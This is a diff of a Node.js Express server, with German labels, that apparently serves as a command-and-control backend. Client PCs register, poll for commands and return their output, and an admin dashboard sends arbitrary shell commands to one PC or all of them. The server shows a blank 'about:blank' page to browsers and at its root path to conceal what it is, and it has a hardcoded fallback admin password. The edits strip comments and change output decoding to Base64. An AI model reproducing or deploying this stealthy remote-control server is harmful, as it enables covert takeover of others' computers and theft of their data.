@@ -7,34 +7,30 @@ const PORT = process.env.PORT || 3000;
 
 app.set('trust proxy', 1);
 
-// Kein Caching
 app.use((req, res, next) => {
     res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
     next();
 });
 
 const ADMIN_PASSWORT = process.env.ADMIN_PASSWORD || "Achtung_Du_Musst_Ein_Passwort_Bei_Render_Eintragen_123456789";
-const AES_KEY = crypto.randomBytes(32); // 256 Bit Schlüssel (wird beim Server-Neustart neu generiert)
+const AES_KEY = crypto.randomBytes(32);
 const ALGORITHM = 'aes-256-cbc';
 
-// --- Token & PC Management (in-memory) ---
-const registeredTokens = {};  // { pcId: { token, lastSeen, online } }
-const pcCommands = {};        // { pcId: "verschlüsselter Befehl" }
+const registeredTokens = {};
+const pcCommands = {};
 
 function generateToken() {
-    return crypto.randomBytes(24).toString('hex'); // 48 Zeichen Token
+    return crypto.randomBytes(24).toString('hex');
 }
 
-// AES Verschlüsseln
 function encrypt(text) {
     const iv = crypto.randomBytes(16);
     const cipher = crypto.createCipheriv(ALGORITHM, AES_KEY, iv);
     let encrypted = cipher.update(text, 'utf8', 'hex');
     encrypted += cipher.final('hex');
-    return iv.toString('hex') + ':' + encrypted; // iv:ciphertext
+    return iv.toString('hex') + ':' + encrypted;
 }
 
-// AES Entschlüsseln
 function decrypt(text) {
     const parts = text.split(':');
     const iv = Buffer.from(parts[0], 'hex');
@@ -64,14 +60,12 @@ const loginLimiter = rateLimit({
 });
 
 // ==================== REGISTRIERUNG ====================
-// PC registriert sich und bekommt Token + PC-ID
 app.post('/register', (req, res) => {
     const { pcId } = req.body;
     if (!pcId) {
         return res.status(400).json({ error: 'pcId erforderlich' });
     }
 
-    // Falls PC schon registriert ist, denselben Token verwenden
     if (!registeredTokens[pcId]) {
         registeredTokens[pcId] = {
             token: generateToken(),
@@ -84,14 +78,13 @@ app.post('/register', (req, res) => {
     registeredTokens[pcId].online = true;
     registeredTokens[pcId].lastSeen = Date.now();
 
-    // Token im Klartext zurückgeben (nur beim ersten Mal nötig)
     res.json({
         token: registeredTokens[pcId].token,
         message: `PC "${pcId}" registriert`
     });
 });
 
-// ==================== HEADLESS ENDPOINT (verschüsselt) ====================
+// ==================== HEADLESS (Befehl holen) ====================
 app.get('/headless', (req, res) => {
     const userAgent = req.headers['user-agent'] || '';
     const istBrowser = /Mozilla|Chrome|Safari|Firefox|Edge|Brave/i.test(userAgent);
@@ -100,47 +93,41 @@ app.get('/headless', (req, res) => {
         return res.send('<!DOCTYPE html><html><head><title>about:blank</title></head><body></body></html>');
     }
 
-    // Token und PC-ID aus Headers lesen
     const token = req.headers['x-pc-token'];
     const pcId = req.headers['x-pc-id'];
 
     if (!token || !pcId) {
-        return res.status(401).send('Unauthorized: Token und PC-ID erforderlich');
+        return res.status(401).send('Unauthorized');
     }
 
-    // Token prüfen
     if (!registeredTokens[pcId] || registeredTokens[pcId].token !== token) {
-        return res.status(403).send('Forbidden: Ungültiger Token');
+        return res.status(403).send('Forbidden');
     }
 
-    // PC als online markieren
     registeredTokens[pcId].online = true;
     registeredTokens[pcId].lastSeen = Date.now();
 
-    // Befehl für diesen PC holen
     const command = pcCommands[pcId];
 
     if (command) {
-        // Befehl entschlüsseln, zurückgeben, und löschen (one-shot)
         try {
             const decryptedCommand = decrypt(command);
-            delete pcCommands[pcId]; // one-shot
+            delete pcCommands[pcId];
             res.set('Content-Type', 'text/plain; charset=utf-8');
             res.send(decryptedCommand);
         } catch (e) {
-            res.status(500).send('Entschlüsselungsfehler');
+            res.status(500).send('Entschluesselungsfehler');
         }
     } else {
-        // Kein Befehl vorhanden
         res.send('KEIN_BEFEHL');
     }
 });
 
-// ==================== OUTPUT EMPFANGEN (vom PC) ====================
+// ==================== OUTPUT EMPFANGEN (FIX: nur Base64, kein AES) ====================
 app.post('/output', (req, res) => {
     const token = req.headers['x-pc-token'];
     const pcId = req.headers['x-pc-id'];
-    const encryptedOutput = req.body.output;
+    const base64Output = req.body.output;
 
     if (!token || !pcId) {
         return res.status(401).json({ error: 'Unauthorized' });
@@ -150,11 +137,10 @@ app.post('/output', (req, res) => {
         return res.status(403).json({ error: 'Forbidden' });
     }
 
-    // Output entschlüsseln und speichern
     try {
-        const decryptedOutput = decrypt(encryptedOutput);
+        // NUR Base64 decodieren, KEIN AES!
+        const decryptedOutput = Buffer.from(base64Output, 'base64').toString('utf8');
         
-        // Im Server-Log speichern (später im Web-GUI anzeigbar)
         if (!app.outputs) app.outputs = {};
         if (!app.outputs[pcId]) app.outputs[pcId] = [];
         app.outputs[pcId].push({
@@ -165,18 +151,17 @@ app.post('/output', (req, res) => {
         console.log(`[OUTPUT] ${pcId}: ${decryptedOutput.substring(0, 100)}...`);
         res.json({ status: 'received' });
     } catch (e) {
-        res.status(500).json({ error: 'Entschlüsselungsfehler' });
+        res.status(500).json({ error: 'Base64 Fehler' });
     }
 });
 
-// ==================== BEFEHl SENDEN (vom Admin) ====================
+// ==================== BEFEHL SENDEN ====================
 app.post('/command', (req, res) => {
     if (!req.session.eingeloggt) {
         return res.status(403).send('Zugriff verweigert!');
     }
 
     const { target, command } = req.body;
-    // target kann sein: "all" oder eine spezifische pcId
 
     if (!command) {
         return res.status(400).send('Befehl erforderlich');
@@ -185,13 +170,11 @@ app.post('/command', (req, res) => {
     const encryptedCommand = encrypt(command);
 
     if (target === 'all') {
-        // An alle registrierten PCs senden
         for (const id in registeredTokens) {
             pcCommands[id] = encryptedCommand;
         }
         res.json({ status: 'Gesendet an ALLE PCs' });
     } else if (registeredTokens[target]) {
-        // An spezifischen PC senden
         pcCommands[target] = encryptedCommand;
         res.json({ status: `Gesendet an ${target}` });
     } else {
@@ -226,7 +209,7 @@ app.get('/outputs/:pcId', (req, res) => {
     res.json(outputs);
 });
 
-// ==================== ADMIN SEITEN (wie vorher) ====================
+// ==================== ADMIN SEITEN ====================
 app.get('/', (req, res) => {
     res.send('<!DOCTYPE html><html><head><title>about:blank</title></head><body></body></html>');
 });
@@ -267,6 +250,7 @@ app.get('/admin/dashboard', (req, res) => {
     <style>
         body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
         h1 { color: #00d4ff; }
+        h2 { color: #00d4ff; }
         .pc-list { margin: 20px 0; }
         .pc-item { padding: 10px; margin: 5px 0; background: #16213e; border-radius: 5px; }
         .online { border-left: 4px solid #00ff88; }
@@ -283,10 +267,13 @@ app.get('/admin/dashboard', (req, res) => {
         .command-box button:hover { background: #ff6b6b; }
         a { color: #00d4ff; }
         .token-info { font-size: 0.8em; color: #888; }
+        #statusMsg { color: #00ff88; margin-left: 15px; }
+        pre { background: #0a0a0a; padding: 15px; border-radius: 5px; 
+              max-height: 400px; overflow-y: auto; white-space: pre-wrap; }
     </style>
 </head>
 <body>
-    <h1>🖥️ Remote Control Dashboard</h1>
+    <h1>Remote Control Dashboard</h1>
     
     <div class="pc-list" id="pcList">
         <h2>Verbundene PCs</h2>
@@ -296,57 +283,64 @@ app.get('/admin/dashboard', (req, res) => {
     <div class="command-box">
         <h2>Befehl senden</h2>
         <select id="target">
-            <option value="all">📡 ALLE PCs (Broadcast)</option>
+            <option value="all">ALLE PCs (Broadcast)</option>
         </select><br>
-        <input type="text" id="command" placeholder="Befehl eingeben... (z.B. ipconfig, dir, systeminfo)" style="width: 400px;"><br>
-        <button onclick="sendCommand()">🚀 Befehl senden</button>
+        <input type="text" id="command" placeholder="Befehl eingeben..." style="width: 400px;"><br>
+        <button onclick="sendCommand()">Befehl senden</button>
+        <span id="statusMsg"></span>
     </div>
 
     <div id="outputSection" style="display:none;">
-        <h2>📟 PC Output</h2>
-        <pre id="pcOutput" style="background: #0a0a0a; padding: 15px; border-radius: 5px; max-height: 400px; overflow-y: auto; white-space: pre-wrap;"></pre>
+        <h2>PC Output</h2>
+        <pre id="pcOutput"></pre>
     </div>
 
     <br><a href="/admin/logout">Ausloggen</a>
 
     <script>
-        // PCs laden
         async function loadPCs() {
             const resp = await fetch('/pcs');
             const pcs = await resp.json();
             const list = document.getElementById('pcList');
             const select = document.getElementById('target');
             
+            // Aktuelle Auswahl merken
+            const currentSelection = select.value;
+            
             list.innerHTML = '<h2>Verbundene PCs</h2>';
-            select.innerHTML = '<option value="all">📡 ALLE PCs (Broadcast)</option>';
+            select.innerHTML = '<option value="all">ALLE PCs (Broadcast)</option>';
             
             pcs.forEach(pc => {
-                // PC Liste
                 const div = document.createElement('div');
                 div.className = 'pc-item ' + (pc.online ? 'online' : 'offline');
-                div.innerHTML = \`
-                    <strong>\${pc.id}</strong> 
-                    \${pc.online ? '🟢 Online' : '🔴 Offline'} 
-                    <span class="token-info">(Letzter Kontakt: \${pc.lastSeen})</span>
-                    <br><small>\${pc.hasOutput} Outputs gespeichert</small>
-                    <button onclick="loadOutput('\${pc.id}')" style="margin-left:10px;">Output anzeigen</button>
-                \`;
+                div.innerHTML = '<strong>' + pc.id + '</strong> ' + 
+                    (pc.online ? 'Online' : 'Offline') + 
+                    ' <span class="token-info">(Letzter Kontakt: ' + pc.lastSeen + ')</span>' +
+                    '<br><small>' + pc.hasOutput + ' Outputs gespeichert</small>' +
+                    ' <button onclick="loadOutput(\\'' + pc.id + '\\')">Output anzeigen</button>';
                 list.appendChild(div);
                 
-                // Target Select
                 const opt = document.createElement('option');
                 opt.value = pc.id;
-                opt.textContent = pc.id + (pc.online ? ' 🟢' : ' 🔴');
+                opt.textContent = pc.id + (pc.online ? ' [Online]' : ' [Offline]');
                 select.appendChild(opt);
             });
+            
+            // Auswahl wiederherstellen, falls PC noch da ist
+            try {
+                const optionExists = Array.from(select.options).some(opt => opt.value === currentSelection);
+                if (optionExists) {
+                    select.value = currentSelection;
+                }
+            } catch(e) {}
         }
 
-        // Befehl senden
         async function sendCommand() {
             const target = document.getElementById('target').value;
             const command = document.getElementById('command').value;
+            const statusMsg = document.getElementById('statusMsg');
             
-            if (!command) { alert('Bitte Befehl eingeben!'); return; }
+            if (!command) { statusMsg.textContent = 'Bitte Befehl eingeben!'; statusMsg.style.color = '#ff4444'; return; }
             
             await fetch('/command', {
                 method: 'POST',
@@ -354,16 +348,19 @@ app.get('/admin/dashboard', (req, res) => {
                 body: JSON.stringify({ target, command })
             });
             
-            alert('Befehl gesendet!');
+            // Kein alert! Nur Text-Feedback
+            statusMsg.textContent = 'Gesendet an ' + (target === 'all' ? 'ALLE PCs' : target);
+            statusMsg.style.color = '#00ff88';
             document.getElementById('command').value = '';
             
-            // Output nach 3 Sekunden laden (wenn spezifischer PC)
             if (target !== 'all') {
                 setTimeout(() => loadOutput(target), 3000);
             }
+            
+            // Nachricht nach 3s ausblenden
+            setTimeout(() => { statusMsg.textContent = ''; }, 3000);
         }
 
-        // Output laden
         async function loadOutput(pcId) {
             const resp = await fetch('/outputs/' + pcId);
             const outputs = await resp.json();
@@ -372,11 +369,13 @@ app.get('/admin/dashboard', (req, res) => {
             section.style.display = 'block';
             
             outputDiv.textContent = outputs.map(o => 
-                '[\${o.timestamp}]\\n' + o.output
+                '[' + o.timestamp + ']\\n' + o.output
             ).join('\\n---\\n') || 'Keine Outputs vorhanden.';
+            
+            // Zum Output-Section scrollen
+            section.scrollIntoView({ behavior: 'smooth' });
         }
 
-        // Auto-Refresh alle 10 Sekunden
         loadPCs();
         setInterval(loadPCs, 10000);
     </script>
@@ -391,7 +390,7 @@ app.get('/admin/logout', (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`Server läuft auf Port ${PORT}`);
+    console.log(`Server laeuft auf Port ${PORT}`);
     console.log(`AES-256 Verschlüsselung AKTIV`);
     console.log(`Admin: /admin`);
 });
